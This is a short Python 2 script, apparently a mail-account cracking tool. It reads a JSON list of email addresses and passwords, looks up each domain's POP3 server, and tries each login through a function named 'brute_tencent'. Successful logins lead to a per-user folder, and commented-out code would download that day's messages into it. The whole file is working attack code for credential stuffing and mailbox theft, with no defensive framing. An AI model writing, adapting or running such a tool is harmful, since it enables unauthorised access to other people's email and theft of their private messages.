# coding=UTF-8
import poplib, string,json,os,re,time 
from email.parser import Parser
from email.header import decode_header
from email.utils import parseaddr

currsTimeStamp = time.strftime("%Y-%m-%d", time.localtime())     
currsTimeStamp+=" 00:00:00"

currsTimeStamp = time.strptime(currsTimeStamp,"%Y-%m-%d %H:%M:%S")
currsTimeStamp = int(time.mktime(currsTimeStamp))

print "哈哈哈"
def brute_tencent(serverName,user, pwd):
    PopServer = poplib.POP3(serverName)
   # print serverName
    PopServer.user(user)
    try:
        PopServer.pass_(pwd)
    except Exception as msg:
        print ""
    else:
       # print("%s  %s" % (user, pwd))
        #download email
        downloadEmail(PopServer,user)
        PopServer.quit()

def downloadEmail(PopServer,user):
    isExists = os.path.exists(user)
    if not isExists:
        os.mkdir(user)

 
    # pattern = u"From: (.*)"
    # file_name = re.search(pattern, msg, re.I) 

    #  for msg_id in PopServer.list()[1]: 
    #     resp, lines, octets = PopServer.top(msg_id,0)               
    #     msg_content = b'\r\n'.join(lines).decode('utf-8')        
    #     msg = Parser().parsestr(msg_content) 

    #     etime = msg['date']
    #     etime = etime.split(" ")
    #     timeStamp = transFormTime(etime)
    #     if timeStamp > currsTimeStamp:
    #         outf = open(user+'/%s.eml' % msg_id, 'w') 
    #         outf.write('\n'.join(PopServer.retr(msg_id)[1])) 
    #         outf.close() 

def transFormTime(etime):
    date = {'Jan':1,'Feb':2,'Mar':3,'Apr':4,'May':5,'Jun':6,'Jul':7,'Aug':8,'Sept':9,'Oct':10,'Nov':11,'Dec':12}
    myTime = str(etime[3]) + '-'+ str(date[etime[2]])+'-'+str(etime[1])+ " "+str(etime[4])
    timeArray = time.strptime(myTime,"%Y-%m-%d %H:%M:%S")
    timeStamp = int(time.mktime(timeArray))
    return timeStamp

value = ['','','']
def print_info(msg):
	global value 
	i = 0
	for header in ['From', 'To', 'Subject']:      
		value[i] = msg.get(header, '')
		if value[i]:
			if header == 'Subject':                
				value[i] = decode_str(value[i])
			else:
				hdr, addr = parseaddr(value[i])
				name = decode_str(hdr)
				value[i] = u'%s <%s>' % (name, addr)
		i = i+1

def decode_str(s):
	value, charset = decode_header(s)[0]
	if charset:
		value = value.decode(charset)
	return value

def get_emailType(email):
    email = email.split(".")
    email = email[0].split("@")
    return server_json[email[1]]


#load serverName
with open('./serverNameConfig.json','r')as severJson:
    server_json = json.load(severJson)

#load email
with open('./email.json','r')as emailJson:
    email_json = json.load(emailJson)    

#red email pass
for user in email_json:
    brute_tencent(get_emailType(user),user, email_json[user])
